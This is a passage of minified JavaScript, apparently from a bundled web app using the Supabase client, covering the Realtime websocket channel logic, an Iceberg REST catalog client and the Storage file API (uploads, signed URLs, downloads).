this.socket.fetch(r,Object.assign(Object.assign({},n),{signal:c.signal}));return clearTimeout(u),h}_push(r,n,l=this.timeout){if(!this.joinedOnce)throw`tried to push '${r}' to '${this.topic}' before joining. Use channel.subscribe() before pushing events`;let c=new hc(this,r,n,l);return this._canPush()?c.send():this._addToPushBuffer(c),c}_addToPushBuffer(r){if(r.startTimeout(),this.pushBuffer.push(r),this.pushBuffer.length>Nx){const n=this.pushBuffer.shift();n&&(n.destroy(),this.socket.log("channel",`discarded push due to buffer overflow: ${n.event}`,n.payload))}}_onMessage(r,n,l){return n}_isMember(r){return this.topic===r}_joinRef(){return this.joinPush.ref}_trigger(r,n,l){var c,u;const h=r.toLocaleLowerCase(),{close:m,error:x,leave:y,join:v}=Sr;if(l&&[m,x,y,v].indexOf(h)>=0&&l!==this._joinRef())return;let _=this._onMessage(h,n,l);if(n&&!_)throw"channel onMessage callbacks must return the payload, modified or unmodified";["insert","update","delete"].includes(h)?(c=this.bindings.postgres_changes)===null||c===void 0||c.filter(S=>{var w,E,T;return((w=S.filter)===null||w===void 0?void 0:w.event)==="*"||((T=(E=S.filter)===null||E===void 0?void 0:E.event)===null||T===void 0?void 0:T.toLocaleLowerCase())===h}).map(S=>S.callback(_,l)):(u=this.bindings[h])===null||u===void 0||u.filter(S=>{var w,E,T,D,z,I,H,te;if(["broadcast","presence","postgres_changes"].includes(h))if("id"in S){const J=S.id,F=(w=S.filter)===null||w===void 0?void 0:w.event;return J&&((E=n.ids)===null||E===void 0?void 0:E.includes(J))&&(F==="*"||F?.toLocaleLowerCase()===((T=n.data)===null||T===void 0?void 0:T.type.toLocaleLowerCase()))&&(!(!((D=S.filter)===null||D===void 0)&&D.table)||S.filter.table===((z=n.data)===null||z===void 0?void 0:z.table))}else{const J=(H=(I=S?.filter)===null||I===void 0?void 0:I.event)===null||H===void 0?void 0:H.toLocaleLowerCase();return J==="*"||J===((te=n?.event)===null||te===void 0?void 0:te.toLocaleLowerCase())}else return S.type.toLocaleLowerCase()===h}).map(S=>{if(typeof _=="object"&&"ids"in _){const w=_.data,{schema:E,table:T,commit_timestamp:D,type:z,errors:I}=w;_=Object.assign(Object.assign({},{schema:E,table:T,commit_timestamp:D,eventType:z,new:{},old:{},errors:I}),this._getPayloadRecords(w))}S.callback(_,l)})}_isClosed(){return this.state===ht.closed}_isJoined(){return this.state===ht.joined}_isJoining(){return this.state===ht.joining}_isLeaving(){return this.state===ht.leaving}_replyEventName(r){return`chan_reply_${r}`}_on(r,n,l){const c=r.toLocaleLowerCase(),u={type:c,filter:n,callback:l};return this.bindings[c]?this.bindings[c].push(u):this.bindings[c]=[u],this}_off(r,n){const l=r.toLocaleLowerCase();return this.bindings[l]&&(this.bindings[l]=this.bindings[l].filter(c=>{var u;return!(((u=c.type)===null||u===void 0?void 0:u.toLocaleLowerCase())===l&&Bn.isEqual(c.filter,n))})),this}static isEqual(r,n){if(Object.keys(r).length!==Object.keys(n).length)return!1;for(const l in r)if(r[l]!==n[l])return!1;return!0}static isFilterValueEqual(r,n){return(r??void 0)===(n??void 0)}_rejoinUntilConnected(){this.rejoinTimer.scheduleTimeout(),this.socket.isConnected()&&this._rejoin()}_onClose(r){this._on(Sr.close,{},r)}_onError(r){this._on(Sr.error,{},n=>r(n))}_canPush(){return this.socket.isConnected()&&this._isJoined()}_rejoin(r=this.timeout){this._isLeaving()||(this.socket._leaveOpenTopic(this.topic),this.state=ht.joining,this.joinPush.resend(r))}_getPayloadRecords(r){const n={new:{},old:{}};return(r.type==="INSERT"||r.type==="UPDATE")&&(n.new=Gh(r.columns,r.record)),(r.type==="UPDATE"||r.type==="DELETE")&&(n.old=Gh(r.columns,r.old_record)),n}}const fc=()=>{},el={HEARTBEAT_INTERVAL:25e3,RECONNECT_DELAY:10,HEARTBEAT_TIMEOUT_FALLBACK:100},Ox=[1e3,2e3,5e3,1e4],Ix=1e4,$x=`
  addEventListener("message", (e) => {
    if (e.data.event === "start") {
      setInterval(() => postMessage({ event: "keepAlive" }), e.data.interval);
    }
  });`;class Dx{constructor(r,n){var l;if(this.accessTokenValue=null,this.apiKey=null,this._manuallySetToken=!1,this.channels=new Array,this.endPoint="",this.httpEndpoint="",this.headers={},this.params={},this.timeout=Cc,this.transport=null,this.heartbeatIntervalMs=el.HEARTBEAT_INTERVAL,this.heartbeatTimer=void 0,this.pendingHeartbeatRef=null,this.heartbeatCallback=fc,this.ref=0,this.reconnectTimer=null,this.vsn=Kh,this.logger=fc,this.conn=null,this.sendBuffer=[],this.serializer=new Sx,this.stateChangeCallbacks={open:[],close:[],error:[],message:[]},this.accessToken=null,this._connectionState="disconnected",this._wasManualDisconnect=!1,this._authPromise=null,this._heartbeatSentAt=null,this._resolveFetch=c=>c?(...u)=>c(...u):(...u)=>fetch(...u),!(!((l=n?.params)===null||l===void 0)&&l.apikey))throw new Error("API key is required to connect to Realtime");this.apiKey=n.params.apikey,this.endPoint=`${r}/${Tc.websocket}`,this.httpEndpoint=Df(r),this._initializeOptions(n),this._setupReconnectionTimer(),this.fetch=this._resolveFetch(n?.fetch)}connect(){if(!(this.isConnecting()||this.isDisconnecting()||this.conn!==null&&this.isConnected())){if(this._setConnectionState("connecting"),this.accessToken&&!this._authPromise&&this._setAuthSafely("connect"),this.transport)this.conn=new this.transport(this.endpointURL());else try{this.conn=wx.createWebSocket(this.endpointURL())}catch(r){this._setConnectionState("disconnected");const n=r.message;throw n.includes("Node.js")?new Error(`${n}

To use Realtime in Node.js, you need to provide a WebSocket implementation:

Option 1: Use Node.js 22+ which has native WebSocket support
Option 2: Install and provide the "ws" package:

  npm install ws

  import ws from "ws"
  const client = new RealtimeClient(url, {
    ...options,
    transport: ws
  })`):new Error(`WebSocket not available: ${n}`)}this._setupConnectionHandlers()}}endpointURL(){return this._appendParams(this.endPoint,Object.assign({},this.params,{vsn:this.vsn}))}disconnect(r,n){if(!this.isDisconnecting())if(this._setConnectionState("disconnecting",!0),this.conn){const l=setTimeout(()=>{this._setConnectionState("disconnected")},100);this.conn.onclose=()=>{clearTimeout(l),this._setConnectionState("disconnected")},typeof this.conn.close=="function"&&(r?this.conn.close(r,n??""):this.conn.close()),this._teardownConnection()}else this._setConnectionState("disconnected")}getChannels(){return this.channels}async removeChannel(r){const n=await r.unsubscribe();return this.channels.length===0&&this.disconnect(),n}async removeAllChannels(){const r=await Promise.all(this.channels.map(n=>n.unsubscribe()));return this.channels=[],this.disconnect(),r}log(r,n,l){this.logger(r,n,l)}connectionState(){switch(this.conn&&this.conn.readyState){case Rs.connecting:return rn.Connecting;case Rs.open:return rn.Open;case Rs.closing:return rn.Closing;default:return rn.Closed}}isConnected(){return this.connectionState()===rn.Open}isConnecting(){return this._connectionState==="connecting"}isDisconnecting(){return this._connectionState==="disconnecting"}channel(r,n={config:{}}){const l=`realtime:${r}`,c=this.getChannels().find(u=>u.topic===l);if(c)return c;{const u=new Bn(`realtime:${r}`,n,this);return this.channels.push(u),u}}push(r){const{topic:n,event:l,payload:c,ref:u}=r,h=()=>{this.encode(r,m=>{var x;(x=this.conn)===null||x===void 0||x.send(m)})};this.log("push",`${n} ${l} (${u})`,c),this.isConnected()?h():this.sendBuffer.push(h)}async setAuth(r=null){this._authPromise=this._performAuth(r);try{await this._authPromise}finally{this._authPromise=null}}_isManualToken(){return this._manuallySetToken}async sendHeartbeat(){var r;if(!this.isConnected()){try{this.heartbeatCallback("disconnected")}catch(n){this.log("error","error in heartbeat callback",n)}return}if(this.pendingHeartbeatRef){this.pendingHeartbeatRef=null,this._heartbeatSentAt=null,this.log("transport","heartbeat timeout. Attempting to re-establish connection");try{this.heartbeatCallback("timeout")}catch(n){this.log("error","error in heartbeat callback",n)}this._wasManualDisconnect=!1,(r=this.conn)===null||r===void 0||r.close(_x,"heartbeat timeout"),setTimeout(()=>{var n;this.isConnected()||(n=this.reconnectTimer)===null||n===void 0||n.scheduleTimeout()},el.HEARTBEAT_TIMEOUT_FALLBACK);return}this._heartbeatSentAt=Date.now(),this.pendingHeartbeatRef=this._makeRef(),this.push({topic:"phoenix",event:"heartbeat",payload:{},ref:this.pendingHeartbeatRef});try{this.heartbeatCallback("sent")}catch(n){this.log("error","error in heartbeat callback",n)}this._setAuthSafely("heartbeat")}onHeartbeat(r){this.heartbeatCallback=r}flushSendBuffer(){this.isConnected()&&this.sendBuffer.length>0&&(this.sendBuffer.forEach(r=>r()),this.sendBuffer=[])}_makeRef(){let r=this.ref+1;return r===this.ref?this.ref=0:this.ref=r,this.ref.toString()}_leaveOpenTopic(r){let n=this.channels.find(l=>l.topic===r&&(l._isJoined()||l._isJoining()));n&&(this.log("transport",`leaving duplicate topic "${r}"`),n.unsubscribe())}_remove(r){this.channels=this.channels.filter(n=>n.topic!==r.topic)}_onConnMessage(r){this.decode(r.data,n=>{if(n.topic==="phoenix"&&n.event==="phx_reply"&&n.ref&&n.ref===this.pendingHeartbeatRef){const y=this._heartbeatSentAt?Date.now()-this._heartbeatSentAt:void 0;try{this.heartbeatCallback(n.payload.status==="ok"?"ok":"error",y)}catch(v){this.log("error","error in heartbeat callback",v)}this._heartbeatSentAt=null,this.pendingHeartbeatRef=null}const{topic:l,event:c,payload:u,ref:h}=n,m=h?`(${h})`:"",x=u.status||"";this.log("receive",`${x} ${l} ${c} ${m}`.trim(),u),this.channels.filter(y=>y._isMember(l)).forEach(y=>y._trigger(c,u,h)),this._triggerStateCallbacks("message",n)})}_clearTimer(r){var n;r==="heartbeat"&&this.heartbeatTimer?(clearInterval(this.heartbeatTimer),this.heartbeatTimer=void 0):r==="reconnect"&&((n=this.reconnectTimer)===null||n===void 0||n.reset())}_clearAllTimers(){this._clearTimer("heartbeat"),this._clearTimer("reconnect")}_setupConnectionHandlers(){this.conn&&("binaryType"in this.conn&&(this.conn.binaryType="arraybuffer"),this.conn.onopen=()=>this._onConnOpen(),this.conn.onerror=r=>this._onConnError(r),this.conn.onmessage=r=>this._onConnMessage(r),this.conn.onclose=r=>this._onConnClose(r),this.conn.readyState===Rs.open&&this._onConnOpen())}_teardownConnection(){if(this.conn){if(this.conn.readyState===Rs.open||this.conn.readyState===Rs.connecting)try{this.conn.close()}catch(r){this.log("error","Error closing connection",r)}this.conn.onopen=null,this.conn.onerror=null,this.conn.onmessage=null,this.conn.onclose=null,this.conn=null}this._clearAllTimers(),this._terminateWorker(),this.channels.forEach(r=>r.teardown())}_onConnOpen(){this._setConnectionState("connected"),this.log("transport",`connected to ${this.endpointURL()}`),(this._authPromise||(this.accessToken&&!this.accessTokenValue?this.setAuth():Promise.resolve())).then(()=>{this.flushSendBuffer()}).catch(n=>{this.log("error","error waiting for auth on connect",n),this.flushSendBuffer()}),this._clearTimer("reconnect"),this.worker?this.workerRef||this._startWorkerHeartbeat():this._startHeartbeat(),this._triggerStateCallbacks("open")}_startHeartbeat(){this.heartbeatTimer&&clearInterval(this.heartbeatTimer),this.heartbeatTimer=setInterval(()=>this.sendHeartbeat(),this.heartbeatIntervalMs)}_startWorkerHeartbeat(){this.workerUrl?this.log("worker",`starting worker for from ${this.workerUrl}`):this.log("worker","starting default worker");const r=this._workerObjectUrl(this.workerUrl);this.workerRef=new Worker(r),this.workerRef.onerror=n=>{this.log("worker","worker error",n.message),this._terminateWorker()},this.workerRef.onmessage=n=>{n.data.event==="keepAlive"&&this.sendHeartbeat()},this.workerRef.postMessage({event:"start",interval:this.heartbeatIntervalMs})}_terminateWorker(){this.workerRef&&(this.log("worker","terminating worker"),this.workerRef.terminate(),this.workerRef=void 0)}_onConnClose(r){var n;this._setConnectionState("disconnected"),this.log("transport","close",r),this._triggerChanError(),this._clearTimer("heartbeat"),this._wasManualDisconnect||(n=this.reconnectTimer)===null||n===void 0||n.scheduleTimeout(),this._triggerStateCallbacks("close",r)}_onConnError(r){this._setConnectionState("disconnected"),this.log("transport",`${r}`),this._triggerChanError(),this._triggerStateCallbacks("error",r)}_triggerChanError(){this.channels.forEach(r=>r._trigger(Sr.error))}_appendParams(r,n){if(Object.keys(n).length===0)return r;const l=r.match(/\?/)?"&":"?",c=new URLSearchParams(n);return`${r}${l}${c}`}_workerObjectUrl(r){let n;if(r)n=r;else{const l=new Blob([$x],{type:"application/javascript"});n=URL.createObjectURL(l)}return n}_setConnectionState(r,n=!1){this._connectionState=r,r==="connecting"?this._wasManualDisconnect=!1:r==="disconnecting"&&(this._wasManualDisconnect=n)}async _performAuth(r=null){let n,l=!1;if(r)n=r,l=!0;else if(this.accessToken)try{n=await this.accessToken()}catch(c){this.log("error","Error fetching access token from callback",c),n=this.accessTokenValue}else n=this.accessTokenValue;l?this._manuallySetToken=!0:this.accessToken&&(this._manuallySetToken=!1),this.accessTokenValue!=n&&(this.accessTokenValue=n,this.channels.forEach(c=>{const u={access_token:n,version:jx};n&&c.updateJoinPayload(u),c.joinedOnce&&c._isJoined()&&c._push(Sr.access_token,{access_token:n})}))}async _waitForAuthIfNeeded(){this._authPromise&&await this._authPromise}_setAuthSafely(r="general"){this._isManualToken()||this.setAuth().catch(n=>{this.log("error",`Error setting auth in ${r}`,n)})}_triggerStateCallbacks(r,n){try{this.stateChangeCallbacks[r].forEach(l=>{try{l(n)}catch(c){this.log("error",`error in ${r} callback`,c)}})}catch(l){this.log("error",`error triggering ${r} callbacks`,l)}}_setupReconnectionTimer(){this.reconnectTimer=new If(async()=>{setTimeout(async()=>{await this._waitForAuthIfNeeded(),this.isConnected()||this.connect()},el.RECONNECT_DELAY)},this.reconnectAfterMs)}_initializeOptions(r){var n,l,c,u,h,m,x,y,v,k,_,S;switch(this.transport=(n=r?.transport)!==null&&n!==void 0?n:null,this.timeout=(l=r?.timeout)!==null&&l!==void 0?l:Cc,this.heartbeatIntervalMs=(c=r?.heartbeatIntervalMs)!==null&&c!==void 0?c:el.HEARTBEAT_INTERVAL,this.worker=(u=r?.worker)!==null&&u!==void 0?u:!1,this.accessToken=(h=r?.accessToken)!==null&&h!==void 0?h:null,this.heartbeatCallback=(m=r?.heartbeatCallback)!==null&&m!==void 0?m:fc,this.vsn=(x=r?.vsn)!==null&&x!==void 0?x:Kh,r?.params&&(this.params=r.params),r?.logger&&(this.logger=r.logger),(r?.logLevel||r?.log_level)&&(this.logLevel=r.logLevel||r.log_level,this.params=Object.assign(Object.assign({},this.params),{log_level:this.logLevel})),this.reconnectAfterMs=(y=r?.reconnectAfterMs)!==null&&y!==void 0?y:(w=>Ox[w-1]||Ix),this.vsn){case Of:this.encode=(v=r?.encode)!==null&&v!==void 0?v:((w,E)=>E(JSON.stringify(w))),this.decode=(k=r?.decode)!==null&&k!==void 0?k:((w,E)=>E(JSON.parse(w)));break;case kx:this.encode=(_=r?.encode)!==null&&_!==void 0?_:this.serializer.encode.bind(this.serializer),this.decode=(S=r?.decode)!==null&&S!==void 0?S:this.serializer.decode.bind(this.serializer);break;default:throw new Error(`Unsupported serializer version: ${this.vsn}`)}if(this.worker){if(typeof window<"u"&&!window.Worker)throw new Error("Web Worker is not supported");this.workerUrl=r?.workerUrl}}}var Ba=class extends Error{constructor(a,r){super(a),this.name="IcebergError",this.status=r.status,this.icebergType=r.icebergType,this.icebergCode=r.icebergCode,this.details=r.details,this.isCommitStateUnknown=r.icebergType==="CommitStateUnknownException"||[500,502,504].includes(r.status)&&r.icebergType?.includes("CommitState")===!0}isNotFound(){return this.status===404}isConflict(){return this.status===409}isAuthenticationTimeout(){return this.status===419}};function zx(a,r,n){const l=new URL(r,a);if(n)for(const[c,u]of Object.entries(n))u!==void 0&&l.searchParams.set(c,u);return l.toString()}async function Ux(a){return!a||a.type==="none"?{}:a.type==="bearer"?{Authorization:`Bearer ${a.token}`}:a.type==="header"?{[a.name]:a.value}:a.type==="custom"?await a.getHeaders():{}}function Lx(a){const r=a.fetchImpl??globalThis.fetch;return{async request({method:n,path:l,query:c,body:u,headers:h}){const m=zx(a.baseUrl,l,c),x=await Ux(a.auth),y=await r(m,{method:n,headers:{...u?{"Content-Type":"application/json"}:{},...x,...h},body:u?JSON.stringify(u):void 0}),v=await y.text(),k=(y.headers.get("content-type")||"").includes("application/json"),_=k&&v?JSON.parse(v):v;if(!y.ok){const S=k?_:void 0,w=S?.error;throw new Ba(w?.message??`Request failed with status ${y.status}`,{status:y.status,icebergType:w?.type,icebergCode:w?.code,details:S})}return{status:y.status,headers:y.headers,data:_}}}}function tl(a){return a.join("")}var Mx=class{constructor(a,r=""){this.client=a,this.prefix=r}async listNamespaces(a){const r=a?{parent:tl(a.namespace)}:void 0;return(await this.client.request({method:"GET",path:`${this.prefix}/namespaces`,query:r})).data.namespaces.map(l=>({namespace:l}))}async createNamespace(a,r){const n={namespace:a.namespace,properties:r?.properties};return(await this.client.request({method:"POST",path:`${this.prefix}/namespaces`,body:n})).data}async dropNamespace(a){await this.client.request({method:"DELETE",path:`${this.prefix}/namespaces/${tl(a.namespace)}`})}async loadNamespaceMetadata(a){return{properties:(await this.client.request({method:"GET",path:`${this.prefix}/namespaces/${tl(a.namespace)}`})).data.properties}}async namespaceExists(a){try{return await this.client.request({method:"HEAD",path:`${this.prefix}/namespaces/${tl(a.namespace)}`}),!0}catch(r){if(r instanceof Ba&&r.status===404)return!1;throw r}}async createNamespaceIfNotExists(a,r){try{return await this.createNamespace(a,r)}catch(n){if(n instanceof Ba&&n.status===409)return;throw n}}};function On(a){return a.join("")}var Fx=class{constructor(a,r="",n){this.client=a,this.prefix=r,this.accessDelegation=n}async listTables(a){return(await this.client.request({method:"GET",path:`${this.prefix}/namespaces/${On(a.namespace)}/tables`})).data.identifiers}async createTable(a,r){const n={};return this.accessDelegation&&(n["X-Iceberg-Access-Delegation"]=this.accessDelegation),(await this.client.request({method:"POST",path:`${this.prefix}/namespaces/${On(a.namespace)}/tables`,body:r,headers:n})).data.metadata}async updateTable(a,r){const n=await this.client.request({method:"POST",path:`${this.prefix}/namespaces/${On(a.namespace)}/tables/${a.name}`,body:r});return{"metadata-location":n.data["metadata-location"],metadata:n.data.metadata}}async dropTable(a,r){await this.client.request({method:"DELETE",path:`${this.prefix}/namespaces/${On(a.namespace)}/tables/${a.name}`,query:{purgeRequested:String(r?.purge??!1)}})}async loadTable(a){const r={};return this.accessDelegation&&(r["X-Iceberg-Access-Delegation"]=this.accessDelegation),(await this.client.request({method:"GET",path:`${this.prefix}/namespaces/${On(a.namespace)}/tables/${a.name}`,headers:r})).data.metadata}async tableExists(a){const r={};this.accessDelegation&&(r["X-Iceberg-Access-Delegation"]=this.accessDelegation);try{return await this.client.request({method:"HEAD",path:`${this.prefix}/namespaces/${On(a.namespace)}/tables/${a.name}`,headers:r}),!0}catch(n){if(n instanceof Ba&&n.status===404)return!1;throw n}}async createTableIfNotExists(a,r){try{return await this.createTable(a,r)}catch(n){if(n instanceof Ba&&n.status===409)return await this.loadTable({namespace:a.namespace,name:r.name});throw n}}},Bx=class{constructor(a){let r="v1";a.catalogName&&(r+=`/${a.catalogName}`);const n=a.baseUrl.endsWith("/")?a.baseUrl:`${a.baseUrl}/`;this.client=Lx({baseUrl:n,auth:a.auth,fetchImpl:a.fetch}),this.accessDelegation=a.accessDelegation?.join(","),this.namespaceOps=new Mx(this.client,r),this.tableOps=new Fx(this.client,r,this.accessDelegation)}async listNamespaces(a){return this.namespaceOps.listNamespaces(a)}async createNamespace(a,r){return this.namespaceOps.createNamespace(a,r)}async dropNamespace(a){await this.namespaceOps.dropNamespace(a)}async loadNamespaceMetadata(a){return this.namespaceOps.loadNamespaceMetadata(a)}async listTables(a){return this.tableOps.listTables(a)}async createTable(a,r){return this.tableOps.createTable(a,r)}async updateTable(a,r){return this.tableOps.updateTable(a,r)}async dropTable(a,r){await this.tableOps.dropTable(a,r)}async loadTable(a){return this.tableOps.loadTable(a)}async namespaceExists(a){return this.namespaceOps.namespaceExists(a)}async tableExists(a){return this.tableOps.tableExists(a)}async createNamespaceIfNotExists(a,r){return this.namespaceOps.createNamespaceIfNotExists(a,r)}async createTableIfNotExists(a,r){return this.tableOps.createTableIfNotExists(a,r)}},_l=class extends Error{constructor(a){super(a),this.__isStorageError=!0,this.name="StorageError"}};function Xe(a){return typeof a=="object"&&a!==null&&"__isStorageError"in a}var Wx=class extends _l{constructor(a,r,n){super(a),this.name="StorageApiError",this.status=r,this.statusCode=n}toJSON(){return{name:this.name,message:this.message,status:this.status,statusCode:this.statusCode}}},Pc=class extends _l{constructor(a,r){super(a),this.name="StorageUnknownError",this.originalError=r}};const Qc=a=>a?(...r)=>a(...r):(...r)=>fetch(...r),qx=()=>Response,Ac=a=>{if(Array.isArray(a))return a.map(n=>Ac(n));if(typeof a=="function"||a!==Object(a))return a;const r={};return Object.entries(a).forEach(([n,l])=>{const c=n.replace(/([-_][a-z])/gi,u=>u.toUpperCase().replace(/[-_]/g,""));r[c]=Ac(l)}),r},Vx=a=>{if(typeof a!="object"||a===null)return!1;const r=Object.getPrototypeOf(a);return(r===null||r===Object.prototype||Object.getPrototypeOf(r)===null)&&!(Symbol.toStringTag in a)&&!(Symbol.iterator in a)},Hx=a=>!a||typeof a!="string"||a.length===0||a.length>100||a.trim()!==a||a.includes("/")||a.includes("\\")?!1:/^[\w!.\*'() &$@=;:+,?-]+$/.test(a);function Wa(a){"@babel/helpers - typeof";return Wa=typeof Symbol=="function"&&typeof Symbol.iterator=="symbol"?function(r){return typeof r}:function(r){return r&&typeof Symbol=="function"&&r.constructor===Symbol&&r!==Symbol.prototype?"symbol":typeof r},Wa(a)}function Kx(a,r){if(Wa(a)!="object"||!a)return a;var n=a[Symbol.toPrimitive];if(n!==void 0){var l=n.call(a,r);if(Wa(l)!="object")return l;throw new TypeError("@@toPrimitive must return a primitive value.")}return(r==="string"?String:Number)(a)}function Gx(a){var r=Kx(a,"string");return Wa(r)=="symbol"?r:r+""}function Jx(a,r,n){return(r=Gx(r))in a?Object.defineProperty(a,r,{value:n,enumerable:!0,configurable:!0,writable:!0}):a[r]=n,a}function Qh(a,r){var n=Object.keys(a);if(Object.getOwnPropertySymbols){var l=Object.getOwnPropertySymbols(a);r&&(l=l.filter(function(c){return Object.getOwnPropertyDescriptor(a,c).enumerable})),n.push.apply(n,l)}return n}function ve(a){for(var r=1;r<arguments.length;r++){var n=arguments[r]!=null?arguments[r]:{};r%2?Qh(Object(n),!0).forEach(function(l){Jx(a,l,n[l])}):Object.getOwnPropertyDescriptors?Object.defineProperties(a,Object.getOwnPropertyDescriptors(n)):Qh(Object(n)).forEach(function(l){Object.defineProperty(a,l,Object.getOwnPropertyDescriptor(n,l))})}return a}const pc=a=>{var r;return a.msg||a.message||a.error_description||(typeof a.error=="string"?a.error:(r=a.error)===null||r===void 0?void 0:r.message)||JSON.stringify(a)},Yx=async(a,r,n)=>{a instanceof await qx()&&!n?.noResolveJson?a.json().then(l=>{const c=a.status||500,u=l?.statusCode||c+"";r(new Wx(pc(l),c,u))}).catch(l=>{r(new Pc(pc(l),l))}):r(new Pc(pc(a),a))},Qx=(a,r,n,l)=>{const c={method:a,headers:r?.headers||{}};return a==="GET"||!l?c:(Vx(l)?(c.headers=ve({"Content-Type":"application/json"},r?.headers),c.body=JSON.stringify(l)):c.body=l,r?.duplex&&(c.duplex=r.duplex),ve(ve({},c),n))};async function Ga(a,r,n,l,c,u){return new Promise((h,m)=>{a(n,Qx(r,l,c,u)).then(x=>{if(!x.ok)throw x;return l?.noResolveJson?x:x.json()}).then(x=>h(x)).catch(x=>Yx(x,m,l))})}async function qa(a,r,n,l){return Ga(a,"GET",r,n,l)}async function _r(a,r,n,l,c){return Ga(a,"POST",r,l,c,n)}async function Oc(a,r,n,l,c){return Ga(a,"PUT",r,l,c,n)}async function Xx(a,r,n,l){return Ga(a,"HEAD",r,ve(ve({},n),{},{noResolveJson:!0}),l)}async function Xc(a,r,n,l,c){return Ga(a,"DELETE",r,l,c,n)}var Zx=class{constructor(a,r){this.downloadFn=a,this.shouldThrowOnError=r}then(a,r){return this.execute().then(a,r)}async execute(){var a=this;try{return{data:(await a.downloadFn()).body,error:null}}catch(r){if(a.shouldThrowOnError)throw r;if(Xe(r))return{data:null,error:r};throw r}}};let zf;zf=Symbol.toStringTag;var eg=class{constructor(a,r){this.downloadFn=a,this.shouldThrowOnError=r,this[zf]="BlobDownloadBuilder",this.promise=null}asStream(){return new Zx(this.downloadFn,this.shouldThrowOnError)}then(a,r){return this.getPromise().then(a,r)}catch(a){return this.getPromise().catch(a)}finally(a){return this.getPromise().finally(a)}getPromise(){return this.promise||(this.promise=this.execute()),this.promise}async execute(){var a=this;try{return{data:await(await a.downloadFn()).blob(),error:null}}catch(r){if(a.shouldThrowOnError)throw r;if(Xe(r))return{data:null,error:r};throw r}}};const tg={limit:100,offset:0,sortBy:{column:"name",order:"asc"}},Xh={cacheControl:"3600",contentType:"text/plain;charset=UTF-8",upsert:!1};var rg=class{constructor(a,r={},n,l){this.shouldThrowOnError=!1,this.url=a,this.headers=r,this.bucketId=n,this.fetch=Qc(l)}throwOnError(){return this.shouldThrowOnError=!0,this}async uploadOrUpdate(a,r,n,l){var c=this;try{let u;const h=ve(ve({},Xh),l);let m=ve(ve({},c.headers),a==="POST"&&{"x-upsert":String(h.upsert)});const x=h.metadata;typeof Blob<"u"&&n instanceof Blob?(u=new FormData,u.append("cacheControl",h.cacheControl),x&&u.append("metadata",c.encodeMetadata(x)),u.append("",n)):typeof FormData<"u"&&n instanceof FormData?(u=n,u.has("cacheControl")||u.append("cacheControl",h.cacheControl),x&&!u.has("metadata")&&u.append("metadata",c.encodeMetadata(x))):(u=n,m["cache-control"]=`max-age=${h.cacheControl}`,m["content-type"]=h.contentType,x&&(m["x-metadata"]=c.toBase64(c.encodeMetadata(x))),(typeof ReadableStream<"u"&&u instanceof ReadableStream||u&&typeof u=="object"&&"pipe"in u&&typeof u.pipe=="function")&&!h.duplex&&(h.duplex="half")),l?.headers&&(m=ve(ve({},m),l.headers));const y=c._removeEmptyFolders(r),v=c._getFinalPath(y),k=await(a=="PUT"?Oc:_r)(c.fetch,`${c.url}/object/${v}`,u,ve({headers:m},h?.duplex?{duplex:h.duplex}:{}));return{data:{path:y,id:k.Id,fullPath:k.Key},error:null}}catch(u){if(c.shouldThrowOnError)throw u;if(Xe(u))return{data:null,error:u};throw u}}async upload(a,r,n){return this.uploadOrUpdate("POST",a,r,n)}async uploadToSignedUrl(a,r,n,l){var c=this;const u=c._removeEmptyFolders(a),h=c._getFinalPath(u),m=new URL(c.url+`/object/upload/sign/${h}`);m.searchParams.set("token",r);try{let x;const y=ve({upsert:Xh.upsert},l),v=ve(ve({},c.headers),{"x-upsert":String(y.upsert)});return typeof Blob<"u"&&n instanceof Blob?(x=new FormData,x.append("cacheControl",y.cacheControl),x.append("",n)):typeof FormData<"u"&&n instanceof FormData?(x=n,x.append("cacheControl",y.cacheControl)):(x=n,v["cache-control"]=`max-age=${y.cacheControl}`,v["content-type"]=y.contentType),{data:{path:u,fullPath:(await Oc(c.fetch,m.toString(),x,{headers:v})).Key},error:null}}catch(x){if(c.shouldThrowOnError)throw x;if(Xe(x))return{data:null,error:x};throw x}}async createSignedUploadUrl(a,r){var n=this;try{let l=n._getFinalPath(a);const c=ve({},n.headers);r?.upsert&&(c["x-upsert"]="true");const u=await _r(n.fetch,`${n.url}/object/upload/sign/${l}`,{},{headers:c}),h=new URL(n.url+u.url),m=h.searchParams.get("token");if(!m)throw new _l("No token returned by API");return{data:{signedUrl:h.toString(),path:a,token:m},error:null}}catch(l){if(n.shouldThrowOnError)throw l;if(Xe(l))return{data:null,error:l};throw l}}async update(a,r,n){return this.uploadOrUpdate("PUT",a,r,n)}async move(a,r,n){var l=this;try{return{data:await _r(l.fetch,`${l.url}/object/move`,{bucketId:l.bucketId,sourceKey:a,destinationKey:r,destinationBucket:n?.destinationBucket},{headers:l.headers}),error:null}}catch(c){if(l.shouldThrowOnError)throw c;if(Xe(c))return{data:null,error:c};throw c}}async copy(a,r,n){var l=this;try{return{data:{path:(await _r(l.fetch,`${l.url}/object/copy`,{bucketId:l.bucketId,sourceKey:a,destinationKey:r,destinationBucket:n?.destinationBucket},{headers:l.headers})).Key},error:null}}catch(c){if(l.shouldThrowOnError)throw c;if(Xe(c))return{data:null,error:c};throw c}}async createSignedUrl(a,r,n){var l=this;try{let c=l._getFinalPath(a),u=await _r(l.fetch,`${l.url}/object/sign/${c}`,ve({expiresIn:r},n?.transform?{transform:n.transform}:{}),{headers:l.headers});const h=n?.download?`&download=${n.download===!0?"":n.download}`:"";return u={signedUrl:encodeURI(`${l.url}${u.signedURL}${h}`)},{data:u,error:null}}catch(c){if(l.shouldThrowOnError)throw c;if(Xe(c))return{data:null,error:c};throw c}}async createSignedUrls(a,r,n){var l=this;try{const c=await _r(l.fetch,`${l.url}/object/sign/${l.bucketId}`,{expiresIn:r,paths:a},{headers:l.headers}),u=n?.download?`&download=${n.download===!0?"":n.download}`:"";return{data:c.map(h=>ve(ve({},h),{},{signedUrl:h.signedURL?encodeURI(`${l.url}${h.signedURL}${u}`):null})),error:null}}catch(c){if(l.shouldThrowOnError)throw c;if(Xe(c))return{data:null,error:c};throw c}}download(a,r){const n=typeof r?.transform<"u"?"render/image/authenticated":"object",l=this.transformOptsToQueryString(r?.transform||{}),c=l?`?${l}`:"",u=this._getFinalPath(a),h=()=>qa(this.fetch,`${this.url}/${n}/${u}${c}`,{headers:this.headers,noResolveJson:!0});return new eg(h,this.shouldThrowOnError)}async info(a){var r=this;const n=r._getFinalPath(a);try{return{data:Ac(await qa(r.fetch,`${r.url}/object/info/${n}`,{headers:r.headers})),error:null}}catch(l){if(r.shouldThrowOnError)throw l;if(Xe(l))return{data:null,error:l};throw l}}async exists(a){var r=this;const n=r._getFinalPath(a);try{return await 